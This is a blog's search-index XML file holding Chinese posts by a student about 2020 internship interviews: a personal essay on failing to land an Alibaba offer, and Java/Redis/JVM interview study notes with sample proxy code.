<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[开始也是谢幕]]></title>
    <url>%2F2020%2F04%2F26%2F2020%E6%98%A5%E6%8B%9B%2F%E5%BC%80%E5%A7%8B%E6%88%96%E8%80%85%E6%98%AF%E8%B0%A2%E5%B9%95%2F</url>
    <content type="text"><![CDATA[开始也是谢幕感谢三太子敖丙文章《我的青春结束了》，同时也向丙哥致敬 那天我决定开始三月中旬，辅导员突然通知的一个蚂蚁金服内推，点亮了在疫情期间，迷茫而无措的我，也正是那一刻，心中炽热的阿里梦，瞬间滚热成一个火球，让我在灰暗的生活中捕捉到了光。阿里在我的眼中，与其他人不同，在其他人眼中阿里是一个高高在上的“大厂”或者是“贴金试炼地”，对于我而言阿里是一个平凡生命中有史以来的第一个称得上梦想的东西。辅导员的通知，对于我而言，不是机会，是让我能接近梦想的奢侈品。于是，顺利成章的加群，去联系群主或者是管理员，去修改简历，因为真的小白，也真的无助，只能厚着脸皮去请别人帮忙。自己还算是比较机智吧，我意识到了一个两个前辈的审批是不够精准的，于是自己从牛客上疯狂去找阿里的内推，只要是阿里的，无脑去问，一次又一次，终于拿到了自己比较满意的简历，在此特别感谢阿里云某团队的老哥帮我改简历，我office都不会的操作，老哥都是半夜12点亲自帮我去改（具体名字和团队就不提了，不想打扰到老哥们的生活），也正是这一版，也是我的最终版简历，还是要表达一下谢意，真的很感谢阿里云的老哥，以及还有美团老哥的鼓励，让我勇敢的去投阿里。之后又投递了，字节，腾讯，蘑菇街，美团等不同的企业，也开始了自己的面试经复习之路。是的，没有看错，我是从投完简历才开始从0开始复习的，因为自己有做外包项目的经验，所以代码还是写过不少的，而且自己不知道行情，一直以为是等疫情结束的开学才会有的，所以一直没去复习面试经，这里确实是自己安排的不够合理。阿里是梦想，那么复习是我更深去触及梦想唯一的途径，复习是残酷的，大概每天8.00起床的样子，到晚上凌晨2.30的样子，大概一周多一些，不到两周的时间，我生平的第一次面试，送给了字节跳动，字节大佬的面试，将我彻底的按在地上摩擦，摩擦，像魔鬼的步伐。。。生平第一次面试就这样交代了，那次面试我自己都面到不想继续面的程度，内心的压抑是到现在为止都害怕的，面试官的不断推进，施压，我，我更是大脑混乱，完全不知所言。面完以后整个人都是压抑的，那一次我对未来的面试都是恐惧。接下来就是蘑菇街的面试了，是一个温柔的小哥哥，循序渐进的引导我，答错了也都无所谓，就是引导，让我分析问题，就这样，我一点一点的思路明晰起来，虽然感觉还是不够满意，但是确实，遇到温柔的人，内心也是温暖的，也点起了些许信心，感谢蘑菇街一面的小哥哥。 拉满的皮筋，憔悴的容不得一丝丝触动与上面的相比，都是有所准备的去面试，阿里的突袭才是噩梦的开始，我投递了几乎阿里所有能看到的部门，现在想想太不懂事了，最后其实只能选一个，自己投了不计其数个，其实我的心思是简单的，就怕简历都过不去，所以只能海投。阿里的面试，很少是预约的，几乎全是猝不及防的突袭，蚂蚁，淘系，阿里云几乎都是突袭，那些天我只要听到手机铃声，整个心都是颤抖的，我不知道大家是怎样的，尤其是直面梦想的时候，我真的很紧张。我只知道自己很少停下，神经一直是紧绷的，容不得一丝丝其它触动，最夸张的是家里人有次不过是说话声音大了一点，我瞬间惊出一生冷汗，心跳不止。因为自己的面试是很晚才开始去准备的，所以很害怕遇到自己不会的东西，还有一些主观对阿里的期望，造成了眼中的心里压力，那些天，我真的没能好好的睡过一觉，叫我起床的不是闹铃，是幻听到的手机铃声。 朝八晚二的生活，一直持续着是的，从投完简历开始，我的生活很规律，都是8点起床，一直到凌晨2点，一直学习，甚至是3点，4点都有。不过好消息是，自己居然顺顺利利的进入了蘑菇街hr面，那一刻，我内心是幸福的，幻想着能和丙哥一起工作，讲真觉得自己好幸运，然后看着b站上蘑菇街实习的一天，无限的向往，可惜好景不长，很多周的等待后，内推人告诉我，我挂了，心已然是支离破碎，很多美好突然成了一抔黄土，烟消云散，后来看到蘑菇街裁员和丙哥的一些文章，我不得不也接受事实。 有幸生平遇到供应链我其实过了一堆的阿里的一面，具体过了多少已经不知道了，每次面完，都是当场给我结果，告诉我一面过了，很多，很多，不光是菜鸟，也有淘系和阿里云的部门，最后还有我最热爱的供应链。对于我而言，第一次去找实习，真的很迷茫，但是有幸遇到了我的供应链内推人，一点一点的去指点我，告诉我复习方向，复习方法，去做思维导图，人和人的交流似乎不用很复杂，只言片语，就可以意气相投，我由衷的感谢，真的哪怕自己后来再遇到什么，都始终让心怀敬意，再后来是一面的面试官，再到后面是团队leader，对我更是醍醐灌顶，我觉得素不相识，而且我还是个双非的普通大三学生，leader愿意跟我说那么多，给我那么多耐心，真的是我无法言语的感谢。尽管后来因为自己资质测试没能过关，20多天一直没有安排三面，但是自己丝毫没有怨言，从某一刻开始，我就觉得哪怕自己春招失败，失去机会，也不想去给团队填任何麻烦，所以我一直等到了内推结束的倒数五天，一直等，从未有丝毫怨言，尽管也错过了不少被捞的机会，但是在我看来单纯是那份恩情，足以让我受用很久很久，没有一点遗憾，也没有一点怨言。 再然后····再然后是自己疯狂去找其它部门去捞，屡屡碰壁，手中0offer的我，心里突然觉得是悲凉的，巨大的灰暗席卷过来，我看到了接近一个多月的地狱般的压抑复习生活，其实毫无作用，毫无结果，当人觉得生活失望的时候，生命中将永远是阳光照不到的角落，想到自己每次面试时的准备都是可笑的，都是徒劳的，没有一丝丝结果，没有一丝丝希望，我戏虐的打量着自己，都是厌恶。自己是个要强的人，我可以忍受自己不在意的方面受尽白眼，可是我无法允许自己为了梦想拼尽全力，却依然徒劳无功，我是悲哀的，是庸人，是一个loser，我心里很难过，却说不出去，因为身边的人都不懂我，更不懂我心里忍受着什么 一个人对自己没有信心的时候，更别提什么狗屁安慰当自己厌恶自己的时候，所有的安慰，问候，无论好坏，都会觉得是对自己的嘲讽和戏虐，从失败的那一刻起，我的只能麻木的刷着短视频，然后睡觉，尽力让自己麻木，让本不宽裕的心，尽量少的去想，颓废可能早就挂满脸上。 谢幕或者是开始今天偶然把头蒙进被子的时候，看到了丙哥《我的青春结束了》，我看到丙哥自己写的，看到 “莫愁前路无知己，天下谁人不识君”的时候，眼眶突然就红了，我不知道是委屈还是怎样，只是那一刻我第一次觉得鼻子真的很酸，眼睛真的很涩当我静下来写这些文字的时候，我还是不知道到底是什么情感，只有这句话深深的刻在自己心上了 开始也是谢幕现在安静了下来，我不想抱怨什么，只是想说，生命不管是什么时候，只要还没死，一切都是过客，一切都还有希望，哪怕是一丝丝，也要去把握。我曾经一个月向我的阿里梦付出一切，我将所有美好都寄托在阿里梦上面，我以为梦碎了，其实是我迷路了，而且摔了很痛的一跤，挺疼的，但梦还在那里。为梦想头破血流，我无怨无悔。为一份情谊，我把自己逼入绝路，我毫无怨言。我有点回忆起我高考选志愿的时候，家里人都不太支持我学计算机，我记得自己说过这么一句话，“我不想平淡无奇，一眼望到头的生活，我想苦尽甘来，生活才真的有了意义”。当时的倔强，就是我现在的生活，是自己的选择，不该有怨言。当自己确定一个梦想的时候，就已经把自己逼上了绝路，无法回头，你是双非，请用让自己212，986去要求自己，比211，985都多个1，不是你比名校多差，只是你需要证明自己不光不差，也更优秀，因为只有弱小的人获得力量后才能更好的去珍惜。如果你是名校，请千万把握住这份优势，别让自己后悔。 有两段歌词《世间美好与你环环相扣》知道你不能 还要你感受让星光加了一点彩虹让樱花偷偷 吻你额头让世间美好 与你环环相扣 希望逆旅者，都能得到这份抚慰 《好像爱这个世界啊》抱着沙发 睡眼昏花 凌乱头发却渴望像电影一样去表达 屋檐脚下 排着乌鸦 密密麻麻被压抑的情绪不知如何去表达 无论我 在这里 在那里仿佛失魂的虫鸣却明白此刻应该做些努力 这就是我的手机铃声，说来碰巧，这是花花写个抑郁症患者的抚慰，那几天的我也接近崩溃，如果你心也如此，请爱这个世界 悄悄说一句我联系到了其它部门可以继续捞我，也算是亡羊补牢我自己也又投了很多offer，或许还有希望]]></content>
  </entry>
  <entry>
    <title><![CDATA[《天净沙·我·二面知识点总结》 双非菜鸡奇葩，面试项目框架，java java，卑微学子去哪？]]></title>
    <url>%2F2020%2F03%2F22%2F2020%E6%98%A5%E6%8B%9B%2F%E6%88%91%E4%B8%BA%E9%98%BF%E9%87%8C-%E4%BA%8C%E9%9D%A2%E7%9F%A5%E8%AF%86%E7%82%B9%2F</url>
    <content type="text"><![CDATA[别问 问就是为了面试豁出了老命 布隆过滤器 布隆过滤器主要是针对大量数据的一个预判，可以给出两种结果，1.一定不存在 2. 可能存在的布隆过滤器使用多个映射的hash函数将一个数据直接映射到一个bit数组上，当进行插入的时候，n个映射函数的值会直接到达布隆过滤器的索引位置，并且设置树脂为1，因此如果发生hash碰撞会发生，某个数组的位置多次为1，情况，因此会得出可能存在的结论，但是如果查找的时候，n个hash函数有任意一位过滤的数组值为不为1，那么则一定不存在。 秒杀系统中为什么会产生超卖的现象？ 由于使用mysql的时候数据库本身的存储引擎innodb是改操作是排他锁，但是读的操作是不上锁的，当到达最后一个的时候，如果都查到还剩下一个，那么其它的请求过来都会同时的更改数据库，那么就会造成超卖，也是快照读的一个弊病。 怎么解决超卖现象？ 最简单的思路，就是每次在sql语句中，更改的时候，在where的时候设条件大于0，但是这样子一旦超过数据库的承受能力，还是会超读每次的读操作都上排他锁，这样子可以避免这个现象，但是会导致性能大幅度降低使用redis是最好的方法，可以把要秒杀的内容放到redis的队列中，使用一次则删除一次 细致深入：Redis实现秒杀系统 核心redis的操作命令，sextnx（细粒度上锁） + expire（强制锁释放） 首先需要将秒杀的数据放到一个redis中，然后在操作redis的时候可以用setnx去操作数据，所谓细粒度锁是一个抽象概念，sexnx就是具体实现（其实更加直白的理解一些，普通的get/put是一个原子操作,但是一系列操作就不再是原子性的了，setnx是一个原子操作，所以可以作为一个细粒度锁） 更加直接的来，就是将数据都加入到redis的list中，然后使用Lpop命令不断获取就ok（移除并返回列表的第一个元素） Redis深入redis能用的的加锁命令分表是INCR、SETNX、SET redis所有的单独的命令都是原子的 INCR 这种加锁的思路是， key 不存在，那么 key 的值会先被初始化为 0 ，然后再执行 INCR 操作进行加一。然后其它用户在执行 INCR 操作进行加一时，如果返回的数大于 1 ，说明这个锁正在被使用当中。 SETNX 这种加锁的思路是，如果 key 不存在，将 key 设置为 value如果 key 已存在，则 SETNX 不做任何动作 SET 借助 Expire 来设置就不是原子性操作了。所以还可以通过事务来确保原子性，但是还是有些问题，所以官方就引用了另外一个，使用 SET 命令本身已经从版本 2.6.12 开始包含了设置过期时间的功能 上锁可能出现的问题1、 redis发现锁失败了要怎么办？中断请求还是循环请求？ 可以利用循环进行重复请求 2、 循环请求的话，如果有一个获取了锁，其它的在去获取锁的时候，是不是容易发生抢锁的可能？ 循环的时候可以sleep一下 3、 锁提前过期后，客户端A还没执行完，然后客户端B获取到了锁，这时候客户端A执行完了，会不会在删锁的时候把B的锁给删掉？ 不一定，可以借助key-value的value进行判断 锁续约问题 Redission当成功的获取一个锁的时候，就会产生一个 watch dog 进行锁续期，每10秒去检查一次，然后重置成设定的过期时间加锁机制是lua脚本解锁过程就比较简单了，如果是程序计数器则继续进行-1，直到等于0，然后删除该key即可（unlock操作） Lua原子性 Redis 使用单个 Lua 解释器去运行所有脚本，并且， Redis 也保证脚本会以原子性(atomic)的方式执行： 当某个脚本正在运行的时候，不会有其他脚本或 Redis 命令被执行。 这和使用 MULTI / EXEC 包围的事务很类似。 在其他别的客户端看来，脚本的效果(effect)要么是不可见的(not visible)，要么就是已完成的(already completed) 了解java内存模型吗，JVM整体和并发的一些关系 Java内存模型就是定义程序中变量（静态变量、数组对象元素等，不包括局部变量、方法参数）的访问规则 内存模型操作的八个指令博客原文 lock：作用于主内存变量，将该变量标识为一个线程独占的状态 unlock：作用于主内存变量，将独占状态释放 read：作用于主内存变量，将值拷贝到工作内存中 load：作用于工作内存中的变量，将值放到工作内存中的变量副本中 use：作用于工作内存中的变量，将值传给执行引擎 asign：作用于工作内存中的变量，将执行引擎中的值赋给工作内存中的变量 store：作用于工作内存中的变量，将值传给主内存 write：作用于主内存中的变量，将工作内存中返回的值放到主内存变量中 volatile 保证load与use必须相邻调用，即要use这个变量，必定先执行read/load，这样每次都能获取到最新的变量值；它又保证asign与store必须相邻调用，即在工作内存中将该变量改了之后，必定会先同步到主内存中 AQS阻塞队列 是一个双向的链表，概念上的队列，但不是真正的实现也是队列 条件队列 是根据condition创建出来的队列，上锁后可以负责对线程的监视，比synchronized的监视器更加灵活，是一个单向的链表，当唤醒界节点的时候会直接添加到阻塞队列中 Node节点1. waitstatus CANCELLED：值为1，在同步队列中等待的线程等待超时或被中断，需要从同步队列中取消该Node的结点，其结点的waitStatus为CANCELLED，即结束状态，进入该状态后的结点将不会再变化。 SIGNAL：值为-1，被标识为该等待唤醒状态的后继结点，当其前继结点的线程释放了同步锁或被取消，将会通知该后继结点的线程执行。说白了，就是处于唤醒状态，只要前继结点释放锁，就会通知标识为SIGNAL状态的后继结点的线程执行。 CONDITION：值为-2，与Condition相关，该标识的结点处于等待队列中，结点的线程等待在Condition上，当其他线程调用了Condition的signal()方法后，CONDITION状态的结点将从等待队列转移到同步队列中，等待获取同步锁。 PROPAGATE：值为-3，与共享模式相关，在共享模式中，该状态标识结点的线程处于可运行状态 2. prev 前驱节点 3. next 后继节点 4. thread thread 同步线程队列主要存储的线程信息。 5. nextwaiterAQS中阻塞队列采用的是用双向链表保存，用prve和next相互链接。而AQS中条件队列是使用单向列表保存的，用nextWaiter来连接。阻塞队列和条件队列并不是使用的相同的数据结构 精髓原帖 在Node节点的源码中有两个常量属性 // 共享模式 static final Node SHARED = new Node(); // 独占模式 static final Node EXCLUSIVE = null; // 其他模式 // 其他非空值：条件等待节点（调用Condition的await方法的时候） NIO Channel(通道)，Buffer(缓冲区), Selector Channel 通道是双向的，通过一个Channel既可以进行读，也可以进行写 Buffer capacity:缓冲区数组的总长度 position:下一个要操作的数据元素的位置 limit:缓冲区数组中不可操作的下一个元素的位置：limit&lt;=capacity mark:用于记录当前position的前一个位置或者默认是-1 Selector Selector类是NIO的核心类，Selector能够检测多个注册的通道上是否有事件发生，如果有事件发生，便获取事件然后针对每个事件进行相应的响应处理 http 和 httpsHTTPS和HTTP的主要区别 https协议需要到CA申请证书，一般免费证书较少，因而需要一定费用。 http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl/tls加密传输协议。 http和https使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。 http的连接很简单，是无状态的；HTTPS协议是由SSL/TLS+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全]]></content>
  </entry>
  <entry>
    <title><![CDATA[《天净沙·我·蘑菇街总结》 双非菜鸡奇葩，面试项目框架，java java，卑微学子去哪？]]></title>
    <url>%2F2020%2F03%2F18%2F2020%E6%98%A5%E6%8B%9B%2F%E6%88%91%E4%B8%BA%E9%98%BF%E9%87%8C-%E8%98%91%E8%8F%87%E8%A1%97%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[2020-03-18 蘑菇街一面 是凉凉了 但是很高兴的是面试官真的很耐心 自己也发现了很多的问题和不足 AOP动态代理的两种方法Proxy + InvocationHandler被代理对象接口1234public interface UserService &#123; public void addUser(User user); public User getUser(int id);&#125; 被代理类接口实现1234567891011public class UserServiceImpl implements UserService &#123; public void addUser(User user) &#123; System.out.println("add user into database."); &#125; public User getUser(int id) &#123; User user = new User(); user.setId(id); System.out.println("getUser from database."); return user; &#125;&#125; 代理（中间）类12345678910111213141516171819public class ProxyUtil implements InvocationHandler &#123; private Object target; // 被代理的对象 public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; System.out.println("do sth before...."); Object result = method.invoke(target, args); System.out.println("do sth after...."); return result; &#125; ProxyUtil(Object target)&#123; this.target = target; &#125; public Object getTarget() &#123; return target; &#125; public void setTarget(Object target) &#123; this.target = target; &#125;&#125; 测试实现1234567891011public class ProxyTest &#123; public static void main(String[] args)&#123; Object proxyedObject = new UserServiceImpl(); // 被代理的对象 ProxyUtil proxyUtils = new ProxyUtil(proxyedObject); // 生成代理对象，对被代理对象的这些接口进行代理：UserServiceImpl.class.getInterfaces() UserService proxyObject = (UserService) Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), UserServiceImpl.class.getInterfaces(), proxyUtils); proxyObject.getUser(1); proxyObject.addUser(new User()); &#125;&#125; 核心则在于被代理的对象必须要有含有自己方法的接口，才可以使用Proxy+InvocationHandler，同时，代理类中主要是通过调用被重写的invoke（）方法。 CGlibCglib代理的实现1234567891011121314151617181920public class CGProxy implements MethodInterceptor&#123; private Object target; // 被代理对象 public CGProxy(Object target)&#123; this.target = target; &#125; public Object intercept(Object arg0, Method arg1, Object[] arg2, MethodProxy proxy) throws Throwable &#123; System.out.println("do sth before...."); Object result = proxy.invokeSuper(arg0, arg2); System.out.println("do sth after...."); return result; &#125; public Object getProxyObject() &#123; Enhancer enhancer = new Enhancer(); enhancer.setSuperclass(this.target.getClass()); // 设置父类 // 设置回调 enhancer.setCallback(this); // 在调用父类方法时，回调 this.intercept() // 创建代理对象 return enhancer.create(); &#125;&#125; 测试结果123456789public class CGProxyTest &#123; public static void main(String[] args)&#123; Object proxyedObject = new UserServiceImpl(); // 被代理的对象 CGProxy cgProxy = new CGProxy(proxyedObject); UserService proxyObject = (UserService) cgProxy.getProxyObject(); proxyObject.getUser(1); proxyObject.addUser(new User()); &#125;&#125; 与Proxy+InvocationHandler不同，Cglib是利用enhancer.create创造了一个代理对象，而这个大力对象的父类就是被代理类，利用enhancer.setSuperclass()指定，同时利用enhancer.setCallback()回调被重写的intercept，完成对方法的包裹 数据库索引聚合索引 和 非聚合索引 聚合索引是 数据行的物理顺序与列值（一般是主键的那一列）的逻辑顺序相同，一个表中只能拥有一个聚集索引。非聚合索引是 该索引中索引的逻辑顺序与磁盘上行的物理存储顺序不同，一个表中可以拥有多个非聚集索引言外之意，索引是有序的，如果存储数据和索引一样有序就是聚合索引，非聚合索引就是数据不是和索引本身一样有序 聚簇索引和非聚簇索引 数据和索引放在一起就是聚簇索引地址和索引在一起，数据是通过地址再关联在一起是非聚簇索引 主索引，辅助索引聚合索引状态下 就是根据主键值建立的索引就是主索引辅助索引又叫二级索引，他的索引存主键的值 非聚合索引状态下 非聚簇索引的主索引和辅助索引的叶子节点的data都是存储的数据的物理地址，也就是说索引和数据并不是存储在一起的，数据的顺序和索引的顺序并没有任何关系，也就是索引顺序与数据物理排列顺序无关。 InnoDB插入缓存 正常情况下正常的插入速度很快 但是如果使用UUID的话，需要离散的先访问非聚集索引索引页，判断非索引也是否在缓冲池中，若在，则直接插入，若没在则放入Insert Buffer中，在Insert Buffer 中合并后插入到索引页，提高了插入性能索引失效问题 组合索引 如果组合索引是abc那么用where a或者where a，b 或者where abc都可以，但是如果用 where b这样子的跳跃会导致索引失效 前导模糊系列 例：(like ‘%XX’或者like ‘%XX%’) or失效 使用 or 的时候会导致索引失效，可以改用union 判断null 索引是b+树的排序结构，如果是null的话，导致节点不知道应该放在哪里 where 子句中使用!=或&lt;&gt;操作符in 和 not in 也要慎用， select id from t where num in(1,2,3) 三范式原文博客 属性原子性行可以唯一识别性数据信息不冲突BCNF 非主属性依赖主属性 主属性也要依赖其它的非主属性 非主属性不能被依赖HashMapHashMap根据hashcode查找到对应位置的方法原帖地址 拿到 key 的 hashCode 值 将 hashCode 的高位参与运算，重新计算 hash 值 将计算出来的 hash 值与 (table.length - 1) 进行 &amp; 运算原因解释如下 首先拿到key的hashcode值，如果是并利用 hashcode ^ table.length (table.length是2次幂)得到hash值，如果是与运算的话，假如table是初始化的16位，那么高位是无法进行运算的，结果值也就是被hashcode值的后四位所决定之后用hash值 进行 hash &amp; (table.length) 线程池的拒绝策略CallerRunsPolicy满了以后用调用线程池的线程去执行他DiscardPolicy直接拒绝，啥也不干AbortPolicy报个错，然后直接拒绝，啥也不干DiscardOldestPolicy抛出最先加入使用的线程]]></content>
  </entry>
  <entry>
    <title><![CDATA[《天净沙·我·被字节血洗篇》 双非菜鸡奇葩，面试项目框架，java java，卑微学子去哪？]]></title>
    <url>%2F2020%2F03%2F16%2F2020%E6%98%A5%E6%8B%9B%2F%E6%88%91%E4%B8%BA%E9%98%BF%E9%87%8C-%E5%AD%97%E8%8A%82%E8%A1%80%E6%B4%97%2F</url>
    <content type="text"><![CDATA[别问 问就是为了面试豁出了老命总结了3.15日字节面试的一些问题，鲜血淋漓篇 高并发 - 为什么Synchronized可以保证线程的安全？博客参考 JVM中对于同步方法和同步代码块是不一样的，本质上都有monitor对象，但是同步方法使用了monitorentre/monitorexit，而同步代码块则使用了ACC_SYNCHRONIZED标志（隐式） 对象头 Java中在JVM的处理上，每一个对象都会有一个对象头，monitor 存在于对象头的Mark Word 中(存储monitor引用指针) Jvm对同步方法的处理（monitorenter/monitorexit）monitorenter 首先一个对象要有自己的monitor，当对象的monitor被占用的时候，则monitor被锁定，之后当一个线程需要获取该对象的时候，则需要调用monitorexit指令，首先要判断monitor的进入数，如果进入数为0，那么monitorenter进入成功，线程进入monitor，然后将进入数设为1，该线程则成为monitor的所有者。 如果线程已经占有了monitor，只是重新进入，那么monitor的进入数+1 如果其它线程在monitor被占领的时候来获取monitor那么，该线程则自动进入到阻塞状态，知道monitor的进入数为0，再重新尝试获取monitor的权限 monitorexit 执行monitorexit必须是该对象monitor的所有者 monitorexit执行成功的时候，则monitor的进入数-1 Jvm对同步代码块的处理（ACC_SYNCHRONIZED） 对于同步代码块，其常量池多了ACC_SYNCHRONIZED标志，也是flag的地方多了ACC_SYNCHRONIZED 同步代码块被调用的时候，JVM会调用指令去检查ACC_SYNCHRONIZED是否被设置，如果设置了则获取monitor，获取成功后则执行代码块中的内容，执行期间其它的线程将无法再获得monitor wait/notify/notifyall wait/notify等方法也依赖于monitor对象，这就是为什么只有在同步的块或者方法中才能调用wait/notify等方法，否则会抛出java.lang.IllegalMonitorStateException的异常的原因 要特别理解的一点是，与sleep方法不同的是wait方法调用完成后，线程将被暂停，但wait方法将会释放当前持有的监视器锁(monitor)，直到有线程调用notify/notifyAll方法后方能继续执行，而sleep方法只让线程休眠并不释放锁。同时notify/notifyAll方法调用后，并不会马上释放监视器锁，而是在相应的synchronized(){}/synchronized方法执行结束后才自动释放锁 Interrupt //中断线程（实例方法）public void Thread.interrupt(); //判断线程是否被中断（实例方法）public boolean Thread.isInterrupted(); //判断是否被中断并清除当前中断状态（静态方法）public static boolean Thread.interrupted(); Interrupt的作用 可以直接中断阻塞的线程，但是无法阻塞获取锁或者拿到锁的线程 JVM - private final a = 1; 请问他的创建的过程？答： 加载 验证 准备 在准备阶段就直接将将值进行替换，不占用内存空间 解析 初始化 深入： static 静态变量在正常情况下是 在准备阶段在方法区分配空间，但是直到最后的初始化阶段才正确的赋值例： public static int value = 5在准备阶段 value 已在方法区获得空间,但是值为0在最后的初始化阶段才真正的编程 5 加载，验证阶段的内容补充加载 在加载阶段（可以参考java.lang.ClassLoader的loadClass()方法），虚拟机需要完成以下3件事情： 通过一个类的全限定名来获取定义此类的二进制字节流（并没有指明要从一个Class文件中获取，可以从其他渠道，譬如：网络、动态生成、数据库等）； 将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构； 在内存中生成一个代表这个类的java.lang.Class对象，作为方法区这个类的各种数据的访问入口； 加载阶段和连接阶段（Linking）的部分内容（如一部分字节码文件格式验证动作）是交叉进行的，加载阶段尚未完成，连接阶段可能已经开始，但这些夹在加载阶段之中进行的动作，仍然属于连接阶段的内容，这两个阶段的开始时间仍然保持着固定的先后顺序。 验证 验证是连接阶段的第一步，这一阶段的目的是为了确保Class文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。验证阶段大致会完成4个阶段的检验动作： 文件格式验证：验证字节流是否符合Class文件格式的规范；例如：是否以魔术0xCAFEBABE开头、主次版本号是否在当前虚拟机的处理范围之内、常量池中的常量是否有不被支持的类型。 元数据验证：对字节码描述的信息进行语义分析（注意：对比javac编译阶段的语义分析），以保证其描述的信息符合Java语言规范的要求；例如：这个类是否有父类，除了java.lang.Object之外。 字节码验证：通过数据流和控制流分析，确定程序语义是合法的、符合逻辑的。 符号引用验证：确保解析动作能正确执行。 验证阶段是非常重要的，但不是必须的，它对程序运行期没有影响，如果所引用的类经过反复验证，那么可以考虑采用-Xverifynone参数来关闭大部分的类验证措施，以缩短虚拟机类加载的时间 JVM - GC回收的时候那些垃圾是怎么被标识的？语义双关注意 可能面试官想问的是标记垃圾的方法（可达性分析和程序计数器法）还可能是想问具体是怎么标记的？ 相关的内容补充OopMap 垃圾回收的时候需要对栈上的内存进行扫描，判断哪些位置存在Reference类型，但是如果是直接查找的话，会产生遍历的问题，这样是慢的。所以HotSpot用OopMap对Reference进行存储，这样子就可以用空间换时间，避免了全栈的扫描 三色标记并发标记 黑色：根对象，或者该对象与它的子对象都被扫描过（对象被标记了，且它的所有field也被标记完了）。 灰色：对象本身被扫描，但还没扫描完该对象中的子对象（它的field还没有被标记或标记完）。 白色：未被扫描对象，扫描完成所有对象之后，最终为白色的为不可达对象，既垃圾对象（对象没有被标记到）。卡表(RememberSet)[https://img-blog.csdn.net/20170705174843116?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveGZ6MDMzMA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center] 以G1收集器为例，G1由于将内存空间分配成了Region，因此如果每个Region都去记录自己的对象引用了什么其它的对象，会造成很多不必要的开销，那么如果换个思维只记录自己的新生代被谁的老年代引用了就可以减小开销（因为新生代无论如何都是要被全部扫描的，记录不同Region新生代与新生代之间的引用是没有意义的，同时老年代很少，因此扫描老年代是不是引用其它新生代会更快），如果被记录的话，则直接假如到GcRoot中这样就可以避免一些不必要的扫描。开始说卡表，每个Region被分成了若干个卡（Card），这些Card都会记录在全局卡表中，Card中每个元素对应着内存区域中一个特定大小的内存块，这个内存块则被称之为卡页，一个卡页一般里面不只一个对象，所以卡页存在着跨Region引用，那么这样的元素的值标识为1。这样在Minor GC时，只需要将变脏的Region(写屏障,这个事情是并发标记的时候完成的，直接加入到GcRoot可以提升效率)中的那个卡页加入GC Roots一并扫描即可。比起扫描老年代的所有对象，大大减少了扫描的数据量，提升了效率 TCP 的连接过程（从网络层去分析） TCP三次握手 四次招手 口述TCP是如何保证数据传输的？线程共享的部分 堆 由于堆是在进程空间中开辟出来的，所以它是理所当然地被共享的；因此new出来的都是共享的（16位平台上分全局堆和局部堆，局部堆是独享的） 全局变量 它是与具体某一函数无关的，所以也与特定线程无关；因此也是共享的 静态变量 虽然对于局部变量来说，它在代码中是“放”在某一函数中的，但是其存放位置和全局变量一样，存于堆中开辟的.bss和.data段，是共享的 文件等公用资源 这个是共享的，使用这些公共资源的线程必须同步。Win32 提供了几种同步资源的方式，包括信号、临界区、事件和互斥体。 深入到操作系统线程之间什么什么是独享的资源 栈 栈是独享的 寄存器请问只要是加了Synchronized就安全了吗？ 静态方法 和 实例方法 的区别 有关List集合的删改功能知道吗？ 就是利用System.copy的功能往前或者往后移动一位扩容机制就是利用调用EnsureCapacityInternal()方法去调用grow函数，再使用Arrays.copyOf进行扩容 Java 线程池的实现线程池的优点原帖线程池能够对线程进行统一分配，调优和监控： 降低资源消耗（线程无限制地创建，然后使用完毕后销毁） 提高响应速度（无须创建线程） 提高线程的可管理性 线程的执行过程 首先添加到核心线程池 核心线程池满以后，直接进入阻塞队列 阻塞队列满了以后判断最大核心数 如果未达到核心线程数目，则线程池进行扩容创建一个Worker执行提交任务，新建的Worker会被添加到线程集合workers中 如果超过maximumPoolSize会执行拒绝策略拒绝策略 调用线程执行 ： 就是调用其它的线程 终止执行： 直接抛出RejectExecutionException异常 丢弃任务： 直接丢弃，不会抛异常 丢失老任务： 删除等待队列中最老的任务，然后重新执行 Mybatis缓存]]></content>
  </entry>
  <entry>
    <title><![CDATA[《天净沙·我·Redis篇》 双非菜鸡奇葩，面试项目框架，java java，卑微学子去哪？]]></title>
    <url>%2F2020%2F03%2F14%2F2020%E6%98%A5%E6%8B%9B%2F%E6%88%91%E4%B8%BA%E9%98%BF%E9%87%8C-Redis%2F</url>
    <content type="text"><![CDATA[别问 问就是为了面试豁出了老命 来来来，讲一讲为什么Redis这么快？ 首先，采用了多路复用io阻塞机制然后，数据结构简单，操作节省时间最后，运行在内存中，自然速度快 Redis为什么是单线程的？ Redis的瓶颈不是cpu的运行速度，而往往是网络带宽和机器的内存大小。再说了，单线程切换开销小，容易实现既然单线程容易实现，而且CPU不会成为瓶颈，那就顺理成章地采用单线程的方案了 如果万一CPU成为你的Redis瓶颈了，或者，你就是不想让服务器其他核闲置，那怎么办 多起几个Redis进程就好了。Redis是keyvalue数据库，又不是关系数据库，数据之间没有约束。只要客户端分清哪些key放在哪个Redis进程上就可以了。redis-cluster可以帮你做的更好 我们使用单线程的方式是无法发挥多核CPU 性能，有什么办法发挥多核CPU的性能嘛？ 我们可以通过在单机开多个Redis 简述一下Redis值的五种类型 String 整数，浮点数或者字符串 Set 集合 Zset 有序集合 Hash 散列表 List 列表 String数据结构 =&gt; SDS123456struct __attribute__ ((__packed__)) sdshdr32 &#123; uint32_t len; //记录当前字节数组的长度 uint32_t alloc; //记录了当前字节数组总共分配的内存大小 unsigned char flags; //记录了当前字节数组的属性、用来标识到底是sdshdr8还是sdshdr16等 char buf[]; //保存了字符串真正的值以及末尾的一个\0&#125;; 记录数组的长度，把复杂度从o(n)变成了0(1) SDS预分配存储空间的方式来减少内存的频繁分配 redis不同长度的字符串用不同的数据结构，因此用flag标记当前是什么类型的数据结构 空间预分配（sdscat =》给字符串后面再拼接一个字符串） 当sdscat 之后内存小于 1M，字符串长度*2+1 （’\0’） 当sdscat 之后内存大于 1M, 字符串长度 + 1M + 